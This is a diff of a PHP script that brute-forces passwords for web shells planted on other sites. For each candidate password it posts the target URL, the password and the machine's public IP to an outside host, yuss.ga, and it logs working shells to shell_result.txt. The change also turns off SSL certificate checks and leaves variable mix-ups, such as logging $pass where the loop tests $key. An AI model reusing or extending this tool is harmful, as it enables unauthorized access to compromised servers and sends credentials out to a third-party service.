@@ -66,32 +66,29 @@ function crotz($x)
                 {
                     if(!empty($key))
                     {
-                    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
-                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                    curl_setopt($ch, CURLOPT_POST, 1);
-                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type);
-                    $exe = curl_exec($ch);
-                    $results = json_decode($exe);
+                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                        curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
+                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                        curl_setopt($ch, CURLOPT_POST, 1);
+                        curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type[1]);
+                        $exe = curl_exec($ch);
+                        $results = json_decode($exe);
 
-                    if($results->status == "success")
-                    {
-                        $end = fopen("shell_result.txt", "a+");
-                        fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
-                        print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
-                        fclose($end);
-                        break;
-                    } else if($results->status == "error")
-                    {
-                        $end = fopen("shell_die.txt", "a+");
-                        fwrite($end, "\n[DIE] Shell at ".$x." password : ".$key);
-                        print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
-                        fclose($end);
-                    } else if($results->status == "error" && empty($key))
-                    {
-                        $end = fopen("shell_die.txt", "a+");
-                        fwrite($end, "\n[DIE] Shell at " . $x);
-                        fclose($end);
-                    }
+                        if($results->status == "success")
+                        {
+                            $end = fopen("shell_result.txt", "a+");
+                            fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
+                            print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
+                            fclose($end);
+                            break;
+                        } else if($results->status == "error")
+                        {
+                            $end = fopen("shell_die.txt", "a+");
+                            fwrite($end, "\n[DIE] Shell at " . $x);
+                            print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
+                            fclose($end);
+                        }
                     }
                 }
             }  else if(!strpos($pass, ".txt"))
